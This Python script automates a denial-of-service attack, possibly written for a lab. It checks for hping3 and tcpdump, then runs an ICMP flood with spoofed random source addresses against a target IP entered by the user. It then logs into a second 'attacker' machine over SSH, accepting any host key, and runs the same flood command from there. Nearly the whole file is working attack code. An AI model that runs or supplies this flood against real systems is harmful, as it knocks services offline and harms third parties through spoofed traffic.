import os
import subprocess
import paramiko

# Function to check if hping3 is installed
def check_hping3():
    try:
        subprocess.run(["hping3", "-v"], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        print("hping3 is already installed.")
    except subprocess.CalledProcessError:
        print("hping3 not found, please install hping3 manually.")
        exit(1)

# Function to check if tcpdump is installed
def check_tcpdump():
    try:
        subprocess.run(
            ["tcpdump", "-v"], 
            check=True, 
            stdout=subprocess.PIPE, 
            stderr=subprocess.PIPE,
            timeout=10  # Set a timeout for tcpdump check
        )
        print("tcpdump is already installed.")
    except subprocess.CalledProcessError:
        print("tcpdump not found, installing...")
        install_tcpdump()
    except subprocess.TimeoutExpired:
        print("tcpdump check timed out. It might be taking too long to run. Proceeding...")

# Function to install tcpdump
def install_tcpdump():
    try:
        subprocess.run(["sudo", "apt-get", "install", "-y", "tcpdump"], check=True)
        print("tcpdump installed successfully.")
    except subprocess.CalledProcessError:
        print("Error trying to install tcpdump. Please check permissions.")

# Function to start the hping3 attack
def start_hping3_attack(target_ip, attack_ip):
    print(f"Starting hping3 attack from {attack_ip} to {target_ip}...")
    try:
        result = subprocess.run(
            ["sudo", "hping3", target_ip, "--flood", "--rand-source", "--icmp", "-c", "25000"],
            check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )
        print("Attack started successfully.")
        print(f"stdout: {result.stdout.decode()}")
        print(f"stderr: {result.stderr.decode()}")
    except subprocess.CalledProcessError as e:
        print("Error running hping3 attack.")
        print(f"stderr: {e.stderr.decode()}")

def ssh_execute(ip, username, commands):
    try:
        # Set up SSH client
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(ip, username=username)
        
        # Execute commands on remote machine
        for command in commands:
            print(f"Running command: {command}")
            stdin, stdout, stderr = ssh.exec_command(command)
            print(f"stdout: {stdout.read().decode()}")
            print(f"stderr: {stderr.read().decode()}")
        
        ssh.close()
    except Exception as e:
        print(f"Failed to SSH into {ip}: {e}")

# Main function
def main():
    # Request the user to input the IPs for the attacker and the target machine
    attack_ip = input("Enter the IP address of the attacker machine: ")
    target_ip = input("Enter the IP address of the target machine: ")

    commands = [
        f"ping -c 4 {target_ip}",  # Ping the target machine to check connectivity
        f"sudo hping3 {target_ip} --flood --rand-source --icmp -c 25000"  # Run hping3 attack
    ]

    # First, check if necessary tools are installed
    check_hping3()  # Ensure hping3 is available
    check_tcpdump()  # Ensure tcpdump is available
    
    # Start the attack
    start_hping3_attack(target_ip, attack_ip)
    
    # Execute commands on the attack machine via SSH
    ssh_execute(attack_ip, "techsupport", commands)

if __name__ == "__main__":
    main()
